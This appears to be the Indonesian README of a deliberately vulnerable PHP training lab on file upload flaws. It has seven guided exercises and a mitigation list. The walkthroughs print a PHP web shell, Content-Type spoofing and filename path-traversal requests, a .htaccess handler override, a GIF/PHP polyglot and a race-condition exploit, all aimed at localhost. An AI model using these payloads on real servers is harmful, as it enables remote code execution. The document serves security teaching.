# File Upload Vulnerabilities Lab

Aplikasi PHP sederhana yang sengaja rentan terhadap File Upload Vulnerabilities, mengikuti
kategori PortSwigger Web Security Academy **File upload vulnerabilities**: dari upload tanpa
validasi sama sekali sampai bypass Content-Type, path traversal pada nama file, blacklist
ekstensi, override handler via `.htaccess`, polyglot, dan race condition.

| Lab | Kategori (PortSwigger) | File | Parameter |
|---|---|---|---|
| 1 | Remote code execution via web shell upload | `lab1_unrestricted.php` | `file` (multipart POST) |
| 2 | Web shell upload via Content-Type restriction bypass | `lab2_content_type.php` | `file` (multipart POST) |
| 3 | Web shell upload via path traversal | `lab3_path_traversal.php` | `file` (multipart POST, `filename`/`full_path`) |
| 4 | Web shell upload via extension blacklist bypass | `lab4_blacklist_bypass.php` | `file` (multipart POST) |
| 5 | Web shell upload via extension handling override (`.htaccess`) | `lab5_obfuscated_extension.php` | `file` (multipart POST) — 2 upload |
| 6 | Remote code execution via polyglot web shell upload | `lab6_polyglot.php` | `file` (multipart POST) |
| 7 | Web shell upload via race condition | `lab7_race_condition.php` | `file` (multipart POST) |

> ⚠️ **PERINGATAN**: Aplikasi ini sengaja rentan dan benar-benar bisa mencapai eksekusi kode
> (RCE) di dalam container lewat webshell yang di-upload. Jangan deploy ke server publik /
> internet. Jalankan hanya di jaringan lab/lokal yang terisolasi. Container dijalankan dengan
> kapabilitas Docker default (tidak ada `--privileged`), jadi dampaknya terbatas pada isi
> container itu sendiri.

## Menjalankan

> Lab ini adalah bagian dari satu stack terpadu. Jalankan dari **root repo** (bukan dari
> folder ini), lihat [README.md utama](../README.md) untuk portal navigasinya.

```bash
cd ..            # ke root repo
docker compose up -d --build
```

Buka langsung `http://localhost:8079/upload/`, atau lewat Portal di
`http://localhost:8079/` → kategori **A05: Injection** → **File Upload Vulnerabilities**.

> Semua akses lewat `gateway` (login Basic Auth, satu port untuk semua lab) — lihat
> [README.md utama](../README.md) bagian "Menjalankan (lokal)" untuk cara generate
> kredensialnya. Login cukup sekali, berlaku juga untuk lab SQLi/XSS/Command Injection/LFI.

Semua lab memakai webshell dasar yang sama, buat file bernama mis. `shell.php` (sesuaikan
ekstensinya per lab) berisi:
```php
<?php system($_GET['cmd']); ?>
```
Setelah berhasil ter-upload ke direktori yang bisa mengeksekusi PHP, akses
`uploads/<nama_file>?cmd=id` untuk membuktikan RCE.

## Panduan tiap lab

### Lab 1 — Unrestricted Upload
Tidak ada validasi ekstensi/konten sama sekali. Upload `shell.php` langsung, akses
`uploads/shell.php?cmd=id`.

### Lab 2 — Content-Type Restriction Bypass
Validasi hanya memeriksa `$_FILES['file']['type']` — nilai ini diambil dari header
`Content-Type` bagian multipart yang dikirim **client sendiri**, sepenuhnya bisa dipalsukan:
```bash
curl -s -F "file=@shell.php;type=image/png" http://localhost:8079/upload/lab2_content_type.php
```

### Lab 3 — Path Traversal pada Nama File
Upload avatar "aman" dibatasi ke `uploads_safe/` (PHP dimatikan di direktori ini), tapi nama
file tidak disanitasi. Sisipkan traversal pada field `filename` (butuh Burp Repeater, browser
tidak izinkan mengetik `../` langsung di dialog pemilih file) supaya file mendarat di
`uploads/` (PHP aktif):
```
Content-Disposition: form-data; name="file"; filename="../uploads/shell.php"
```
> Catatan PHP 8.1+: `$_FILES['file']['name']` sekarang otomatis di-`basename()` oleh PHP
> sendiri — path aslinya (termasuk `../`) hanya tersedia lewat field baru `full_path`. Lab ini
> memakai `full_path` (dengan fallback ke `name` untuk PHP lama) supaya teknik ini tetap bisa
> dipraktikkan pada PHP modern.

### Lab 4 — Extension Blacklist Bypass
Blacklist memblokir `.php/.php3/.php4/.php5/.php7` tapi lupa `.phtml`/`.pht`, yang tetap
dieksekusi PHP oleh konfigurasi Apache tambahan pada lab ini (lihat
`apache/php-legacy-extensions.conf` — mensimulasikan environment hosting lama yang lebih
longgar; image `php:8.2-apache` resmi HANYA mengeksekusi `.php` secara default). Upload
`shell.phtml`.

### Lab 5 — Extension Handling Override via `.htaccess`
Blacklist ekstensi kali ini sudah lengkap (termasuk `.phtml`/`.pht`) — tapi tidak menyangka
nama file yang di-upload bisa berupa file **konfigurasi Apache itu sendiri**. Direktori
`uploads/` punya `AllowOverride All` aktif (default pada image `php:8.2-apache`), jadi
`.htaccess` yang berhasil ter-upload langsung berlaku untuk request berikutnya:
```bash
# 1. Upload file bernama persis ".htaccess" berisi:
echo 'AddType application/x-httpd-php .jpg' > .htaccess
curl -s -F "file=@.htaccess" http://localhost:8079/upload/lab5_obfuscated_extension.php

# 2. Upload webshell dengan ekstensi "aman" (.jpg tidak ada di blacklist manapun)
curl -s -F "file=@shell.php;filename=shell.jpg" http://localhost:8079/upload/lab5_obfuscated_extension.php

# 3. Apache sekarang menjalankan .jpg sebagai PHP, mengikuti .htaccess attacker
curl -s "http://localhost:8079/upload/uploads/shell.jpg?cmd=id"
```

### Lab 6 — Polyglot Web Shell
Fitur ini memang mengizinkan ekstensi `.php`, tapi menambahkan pengecekan `getimagesize()`
yang hanya membaca header di awal file. Buat file polyglot (header GIF + kode PHP):
```bash
printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>' > shell.php
```

### Lab 7 — Race Condition
File disimpan dulu ke direktori executable, baru divalidasi & dihapus **3 detik kemudian**
(dilebar-lebarkan dari milidetik sungguhan supaya bisa didemokan manual). Upload `shell.php`,
lalu secepatnya di tab/terminal lain:
```bash
curl "http://localhost:8079/upload/uploads/shell.php?cmd=id"
```

## Mitigasi (untuk didiskusikan setelah lab)
- **Validasi ekstensi dengan allowlist ketat** (bukan blacklist) yang dicocokkan
  case-insensitive terhadap SELURUH nama file (bukan hanya substring), dan pastikan tidak ada
  ekstensi executable lain yang terlewat (`.phtml`, `.pht`, `.phar`, dst — Lab 4).
- **Jangan percaya `Content-Type` dari client** — deteksi tipe file yang sesungguhnya di
  server lewat magic bytes (mis. `finfo_file()` dengan `FILEINFO_MIME_TYPE`), bukan header
  yang dikirim browser/attacker (Lab 2).
- **`getimagesize()`/validasi "terlihat seperti gambar" bukan jaminan file aman** — itu hanya
  membaca header, bukan memindai seluruh isi file. Jangan gabungkan izin ekstensi executable
  dengan asumsi validasi konten sudah cukup (Lab 6).
- **Selalu regenerasi nama file di server** (mis. UUID + ekstensi dari allowlist), jangan
  pernah pakai nama file dari input pengguna untuk membangun path penyimpanan — ini
  menghilangkan seluruh kelas path traversal pada nama file (Lab 3) **dan** upload file
  konfigurasi seperti `.htaccess` (Lab 5) sekaligus.
- **Nonaktifkan `AllowOverride` (set ke `None`) pada direktori upload**, atau minimal larang
  file konfigurasi web server (`.htaccess`, `web.config`, dst) lewat allowlist ekstensi yang
  benar-benar ketat — jangan andalkan blacklist ekstensi script saja untuk mencegah upload
  file non-script yang bisa mengubah perilaku server (Lab 5).
- **Simpan file upload di luar webroot**, atau di direktori dengan eksekusi script dimatikan
  secara eksplisit di level web server (bukan hanya "developer lupa taruh index.php di sana")
  — dan pastikan SATU-SATUNYA jalur pindah dari staging ke direktori publik adalah lewat kode
  aplikasi yang tervalidasi penuh, bukan hasil upload mentah.
- **Validasi dan reject file SEBELUM disimpan ke lokasi yang bisa diakses publik** — proses
  scanning/validasi asinkron yang menyimpan file dulu baru mengecek belakangan selalu membuka
  race window, sekecil apa pun jendelanya (Lab 7).
- Batasi ukuran file, jumlah upload per user/waktu, dan jalankan proses upload dengan
  **least privilege** di sandbox/container terpisah agar dampak RCE dari webshell tetap
  terbatas.
